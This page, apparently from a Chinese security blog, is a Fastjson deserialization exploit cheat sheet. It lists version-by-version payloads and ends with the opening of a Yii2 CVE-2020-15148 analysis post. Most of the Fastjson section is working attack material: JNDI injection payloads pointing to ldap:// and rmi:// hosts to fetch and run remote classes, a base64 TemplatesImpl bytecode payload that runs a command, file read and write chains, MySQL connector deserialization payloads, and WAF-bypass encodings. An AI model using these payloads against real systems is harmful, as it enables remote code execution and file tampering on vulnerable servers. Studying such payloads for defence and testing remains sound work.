&quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;:&quot;$$BCEL...&quot;            &#125;        &#125; : &quot;ddd&quot;    &#125;&#125;</code></pre><p>1.2.37&lt;=fastjson&lt;=1.2.47</p><pre><code class="java">&#123;    &quot;name&quot;:    &#123;        &quot;@type&quot; : &quot;java.lang.Class&quot;,        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;    &#125;,    &quot;x&quot; : &#123;        &quot;name&quot;: &#123;            &quot;@type&quot; : &quot;java.lang.Class&quot;,            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;        &#125;,        &quot;y&quot;: &#123;            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,            &quot;c&quot;: &#123;                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;:&quot;$$BCEL$..&quot;,                     &quot;$ref&quot;: &quot;$.x.y.c.connection&quot;            &#125;        &#125;    &#125;&#125;</code></pre><p>其他</p><pre><code class="java">&#123;  &quot;@type&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,  &quot;key&quot;: &#123;    &quot;@type&quot;: &quot;java.lang.Class&quot;,    &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;  &#125;,  &quot;driverClassLoader&quot;: &#123;    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;  &#125;,  &quot;driver&quot;: &quot;$$BCEL$$xxxxxxx&quot;&#125;</code></pre><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>利用条件苛刻，可用于解决不出网利用。</p><p>需要调用<code>parseObject()</code>方法时，加入Feature.SupportNonPublicField参数。</p><p>  _bytecodes要进行base64编码</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAkACUBAAZURU1QT0MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACwAEAAwADQANAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg==&quot;],&quot;_name&quot;:&quot;a.b&quot;,&quot;_tfactory&quot;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</code></pre><h4 id="c3p0-WrapperConnectionPoolDataSource"><a href="#c3p0-WrapperConnectionPoolDataSource" class="headerlink" title="c3p0#WrapperConnectionPoolDataSource"></a>c3p0#WrapperConnectionPoolDataSource</h4><p>可用于解决不出网利用。</p><p>fastjson &lt;1.2.47</p><p>利用c3p0二次反序列化 cc payload到达回显。</p><pre><code class="java">POST /json HTTP/1.1Host: 127.0.0.1:8999Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip, deflatecmd: dirAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/jsonContent-Length: 8925&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:;&quot;&#125;&#125;</code></pre><h3 id="Fastjson-1-2-25-1-2-41"><a href="#Fastjson-1-2-25-1-2-41" class="headerlink" title="Fastjson 1.2.25-1.2.41"></a>Fastjson 1.2.25-1.2.41</h3><p>1.2.25后将TypeUtils.loadClass替换为checkAutoType()函数，增加了黑名单和白名单。</p><p>把autoTypeSupport默认为False。</p><p>当autoTypeSupport为False时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错。</p><p>当autoTypeSupport为True时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。</p><p>1.2.25黑名单</p><pre><code class="java">bshcom.mchangecom.sun.java.lang.Threadjava.net.Socketjava.rmijavax.xmlorg.apache.bcelorg.apache.commons.beanutilsorg.apache.commons.collections.Transformerorg.apache.commons.collections.functorsorg.apache.commons.collections4.comparatorsorg.apache.commons.fileuploadorg.apache.myfaces.context.servletorg.apache.tomcatorg.apache.wicket.utilorg.codehaus.groovy.runtimeorg.hibernateorg.jbossorg.mozilla.javascriptorg.python.coreorg.springframework</code></pre><p>exp</p><p>条件需要开启autotype</p><p>类名前面加了一个L，后面加一个;可以绕过黑名单</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/badNameClass&quot;, &quot;autoCommit&quot;:true&#125;</code></pre><h3 id="Fastjson-1-2-25-1-2-42"><a href="#Fastjson-1-2-25-1-2-42" class="headerlink" title="Fastjson 1.2.25-1.2.42"></a>Fastjson 1.2.25-1.2.42</h3><p>从1.2.42版本开始,把之前的明文黑名单，改为hash黑名单。</p><p>如下大佬整理的</p><p><a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p><p>exp</p><p>条件需要开启autotype</p><p>双写绕过</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/badNameClass&quot;, &quot;autoCommit&quot;:true&#125;</code></pre><h3 id="Fastjson-1-2-25-1-2-43"><a href="#Fastjson-1-2-25-1-2-43" class="headerlink" title="Fastjson 1.2.25-1.2.43"></a>Fastjson 1.2.25-1.2.43</h3><p>exp</p><p>条件需要开启autotype</p><p>加[{绕过</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/badNameClass&quot;, &quot;autoCommit&quot;:true&#125;</code></pre><h3 id="Fastjson-1-2-25-1-2-45"><a href="#Fastjson-1-2-25-1-2-45" class="headerlink" title="Fastjson 1.2.25-1.2.45"></a>Fastjson 1.2.25-1.2.45</h3><p>条件需要开启autotype</p><p>45把之前问题修了，但是可以借助第三方组件绕过。</p><p>需要mybatis，且版本需为3.x.x系列&lt;3.5.0的版本。</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap://localhost:1389/badNameClass&quot;&#125;&#125;</code></pre><h3 id="Fastjson1-2-25-1-2-47通杀"><a href="#Fastjson1-2-25-1-2-47通杀" class="headerlink" title="Fastjson1.2.25-1.2.47通杀"></a>Fastjson1.2.25-1.2.47通杀</h3><p>借助缓存进行通杀，缓存在1.2.48被改为默认关闭</p><p>漏洞原理是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测</p><p>这里有两大版本范围：</p><ul><li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用</li><li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</li></ul><p>poc:</p><pre><code class="java">&#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;ldap://localhost:1389/badNameClass&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre><h3 id="Fastjson1-2-5-lt-1-2-59"><a href="#Fastjson1-2-5-lt-1-2-59" class="headerlink" title="Fastjson1.2.5 &lt;= 1.2.59"></a>Fastjson1.2.5 &lt;= 1.2.59</h3><p>需要开启AutoType</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</code></pre><h3 id="Fastjson1-2-5-lt-1-2-60"><a href="#Fastjson1-2-5-lt-1-2-60" class="headerlink" title="Fastjson1.2.5 &lt;= 1.2.60"></a>Fastjson1.2.5 &lt;= 1.2.60</h3><p><strong>无需开启 autoType：</strong></p><pre><code class="shell">&#123;&quot;@type&quot;:&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,&quot;xaDataSourceName&quot;:&quot;rmi://10.10.20.166:1099/ExportObject&quot;&#125;&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://10.10.20.166:1389/ExportObject&quot;&#125;</code></pre><h3 id="Fastjson1-2-5-lt-1-2-61"><a href="#Fastjson1-2-5-lt-1-2-61" class="headerlink" title="Fastjson1.2.5 &lt;= 1.2.61"></a>Fastjson1.2.5 &lt;= 1.2.61</h3><pre><code class="java">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;Object&quot;:&quot;a&quot;&#125;</code></pre><h3 id="Fastjson-lt-1-2-62"><a href="#Fastjson-lt-1-2-62" class="headerlink" title="Fastjson &lt;1.2.62"></a>Fastjson &lt;1.2.62</h3><ul><li>需要开启AutoType；</li><li>Fastjson &lt;= 1.2.62；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>目标服务端需要存在xbean-reflect包；</li></ul><pre><code class="java">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi://127.0.0.1:1098/exploit&quot;&#125;&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125;</code></pre><h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>开启AutoType；</li><li>Fastjson &lt;= 1.2.66；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li><li>br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包；</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li></ul><pre><code class="java">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://192.168.80.1:1399/Calc&quot;&#125;&#125;</code></pre><p>适用于jdk11以上版本的写文件的payload：</p><pre><code class="java">&#123;    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;sun.rmi.server.MarshalOutputStream&quot;,    &quot;out&quot;: &#123;        &quot;@type&quot;: &quot;java.util.zip.InflaterOutputStream&quot;,        &quot;out&quot;: &#123;           &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;,           &quot;file&quot;: &quot;/tmp/asdasd&quot;,           &quot;append&quot;: true        &#125;,        &quot;infl&quot;: &#123;           &quot;input&quot;: &#123;               &quot;array&quot;: &quot;eJxLLE5JTCkGAAh5AnE=&quot;,               &quot;limit&quot;: 14           &#125;        &#125;,        &quot;bufLen&quot;: &quot;100&quot;    &#125;,    &quot;protocolVersion&quot;: 1&#125;</code></pre><h3 id="fastjson-lt-1-2-67"><a href="#fastjson-lt-1-2-67" class="headerlink" title="fastjson&lt;=1.2.67"></a>fastjson&lt;=1.2.67</h3><h3 id="前提条件-1"><a href="#前提条件-1" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>开启AutoType；</li><li>Fastjson &lt;= 1.2.67；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</li></ul><pre><code class="json">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;</code></pre><h3 id="fastjson-lt-1-2-68"><a href="#fastjson-lt-1-2-68" class="headerlink" title="fastjson&lt;=1.2.68"></a>fastjson&lt;=1.2.68</h3><ul><li>Fastjson &lt;= 1.2.68；</li><li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中；</li></ul><pre><code class="java">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;&#123;&quot;@type&quot;:&quot;com.caucho.config.types.ResourceRef&quot;,&quot;lookupName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;value&quot;: &#123;&quot;$ref&quot;:&quot;$.value&quot;&#125;&#125;</code></pre><p>无需开启AutoType，直接成功绕过CheckAutoType()的检测从而触发执行：</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;vul.VulAutoCloseable&quot;,&quot;cmd&quot;:&quot;calc&quot;&#125;</code></pre><p>读文件</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;tempPath&quot;:&quot;C:/Windows/win.ini&quot;, &quot;targetPath&quot;:&quot;D:/wamp64/www/win.txt&quot;&#125;</code></pre><p>写文件</p><pre><code class="json">&#123;    &quot;stream&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,        &quot;targetPath&quot;: &quot;D:/wamp64/www/hacked.txt&quot;,        &quot;tempPath&quot;: &quot;D:/wamp64/www/test.txt&quot;    &#125;,    &quot;writer&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,        &quot;buffer&quot;: &quot;cHduZWQ=&quot;,        &quot;outputStream&quot;: &#123;            &quot;$ref&quot;: &quot;$.stream&quot;        &#125;,        &quot;position&quot;: 5    &#125;,    &quot;close&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,        &quot;out&quot;: &#123;            &quot;$ref&quot;: &quot;$.writer&quot;        &#125;    &#125;&#125;</code></pre><p>写文件</p><pre><code class="java">&#123;    &#39;stream&#39;:    &#123;        &#39;@type&#39;:&quot;java.lang.AutoCloseable&quot;,        &#39;@type&#39;:&#39;java.io.FileOutputStream&#39;,        &#39;file&#39;:&#39;/tmp/nonexist&#39;,        &#39;append&#39;:false    &#125;,    &#39;writer&#39;:    &#123;        &#39;@type&#39;:&quot;java.lang.AutoCloseable&quot;,        &#39;@type&#39;:&#39;org.apache.solr.common.util.FastOutputStream&#39;,        &#39;tempBuffer&#39;:&#39;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&#39;,        &#39;sink&#39;:        &#123;            &#39;$ref&#39;:&#39;$.stream&#39;        &#125;,        &#39;start&#39;:38    &#125;,    &#39;close&#39;:    &#123;        &#39;@type&#39;:&quot;java.lang.AutoCloseable&quot;,        &#39;@type&#39;:&#39;org.iq80.snappy.SnappyOutputStream&#39;,        &#39;out&#39;:        &#123;            &#39;$ref&#39;:&#39;$.writer&#39;        &#125;    &#125;&#125;</code></pre><p>适用于jdk8/10的</p><pre><code class="java">&#123;    &#39;@type&#39;:&quot;java.lang.AutoCloseable&quot;,    &#39;@type&#39;:&#39;sun.rmi.server.MarshalOutputStream&#39;,    &#39;out&#39;:    &#123;        &#39;@type&#39;:&#39;java.util.zip.InflaterOutputStream&#39;,        &#39;out&#39;:        &#123;           &#39;@type&#39;:&#39;java.io.FileOutputStream&#39;,           &#39;file&#39;:&#39;dst&#39;,           &#39;append&#39;:false        &#125;,        &#39;infl&#39;:        &#123;            &#39;input&#39;:&#39;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#39;        &#125;,        &#39;bufLen&#39;:1048576    &#125;,    &#39;protocolVersion&#39;:1&#125;</code></pre><h3 id="fastjson未知版本"><a href="#fastjson未知版本" class="headerlink" title="fastjson未知版本"></a>fastjson未知版本</h3><pre><code class="java">&#123;&quot;@type&quot;:&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;, &quot;tmJndiName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;tmFromJndi&quot;: true, &quot;transactionManager&quot;: &#123;&quot;$ref&quot;:&quot;$.transactionManager&quot;&#125;&#125;&#123;&quot;@type&quot;:&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;, &quot;tmJndiName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;tmFromJndi&quot;: true, &quot;transactionManager&quot;: &#123;&quot;$ref&quot;:&quot;$.transactionManager&quot;&#125;&#125;</code></pre><p>腾讯玄武黑帽大会分享，具体版本待整理复现</p><pre><code class="java">Mysqlconnector 5.1.x&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;mysql.host&quot;,&quot;portToConnectTo&quot;:3306,&quot;info&quot;:&#123;&quot;user&quot;:”user&quot;,&quot;password&quot;:”pass&quot;,&quot;statementInterceptors&quot;:&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;,&quot;NUM_HOSTS&quot;: &quot;1&quot;&#125;,&quot;databaseToConnectTo&quot;:”dbname&quot;,&quot;url&quot;:&quot;&quot;&#125;Mysqlconnector 6.0.2 or 6.0.3&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;,&quot;proxy&quot;:&#123;&quot;connectionString&quot;:&#123;&quot;url&quot;: &quot;jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true&quot;&#125;&#125;&#125;Mysqlconnector 6.x or &lt; 8.0.20&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;,&quot;proxy&quot;:&#123;&quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;,&quot;connectionUrl&quot;:&#123;&quot;@type&quot;:&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;, &quot;masters&quot;: [&#123;&quot;host&quot;:&quot;mysql.host&quot;&#125;], &quot;slaves&quot;:[], &quot;properties&quot;:&#123;&quot;host&quot;:&quot;mysql.host&quot;,&quot;user&quot;:&quot;user&quot;,&quot;dbname&quot;:&quot;dbname&quot;,&quot;password&quot;:&quot;pass&quot;,&quot;queryInterceptors&quot;:&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;&#125;&#125;&#125;&#125;</code></pre><h2 id="bypasswaf"><a href="#bypasswaf" class="headerlink" title="bypasswaf"></a>bypasswaf</h2><p>Fastjson默认会去除键、值外的空格、<code>\b</code>、<code>\n</code>、<code>\r</code>、<code>\f</code>等，同时还会自动将键与值进行unicode与十六进制解码。</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;&#123;  &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;&#123;/*s6*/&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;&#123;\n&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;&#123;&quot;@type&quot;\b:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;  &#123;&quot;\x40\x74\x79\x70\x65&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-15148Yii2反序列化RCE分析与复现</title>
      <link href="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="1、影响范围"><a href="#1、影响范围" class="headerlink" title="1、影响范围"></a>1、影响范围</h3><p> Yii2 &lt; 2.0.38</p><h3 id="2、环境搭建"><a href="#2、环境搭建" class="headerlink" title="2、环境搭建"></a>2、环境搭建</h3><p>影响范围：Yii2 &lt; 2.0.38</p><p>所以我们下载2.0.37即可</p><p><a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a></p><p>之后直接在根目录下执行php yii serve开启服务，然后修改下配置文件config/web.php；给cookieValidationKey修改一个任意值，不然会报错<img src="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/%E9%85%8D%E7%BD%AE%E4%BF%AE%E6%94%B9.png"></p><h3 id="3、PHP（反）序列化有关的魔法函数"><a href="#3、PHP（反）序列化有关的魔法函数" class="headerlink" title="3、PHP（反）序列化有关的魔法函数"></a><strong>3、PHP（反）序列化有关的魔法函数</strong></h3><p>环境搭建好了，就先了解下魔法函数，方便后面利用链的理解。</p><p>**__construct()**：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</p><p>**__destruct()**：当对象被销毁时会自动调用。</p><p>**__call()**：是在对象上下文中调用不可访问的方法时触发</p><p>**__callStatic()**：是在静态上下文中调用不可访问的方法时触发。</p><p>**__get()**：用于从不可访问的属性读取数据。</p><p>**__set()**：用于将数据写入不可访问的属性。</p><p>**__isset()**：在不可访问的属性上调用isset()或empty()触发。</p><p>**__unset()**：在不可访问的属性上使用unset()时触发。</p><p>**__sleep():**在执行序列化函数serialize()时执行。</p><p>**__wakeup():**在执行反序列化函数unserialize()时执行。</p><p><strong>__toString()</strong>:允许一个类决定如何处理像一个字符串时它将如何反应。</p><p><strong>__invoke()</strong>:脚本尝试将对象调用为函数时，调用__invoke()方法。</p><p><strong>常用魔法函数图示，更加直观理解</strong></p><p><img src="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0.png"></p><h3 id="4、漏洞分析与复现"><a href="#4、漏洞分析与复现" class="headerlink" title="4、漏洞分析与复现"></a>4、漏洞分析与复现</h3><p><strong>分析：</strong></p><p>从大佬们的EXP入手分析</p><p><img 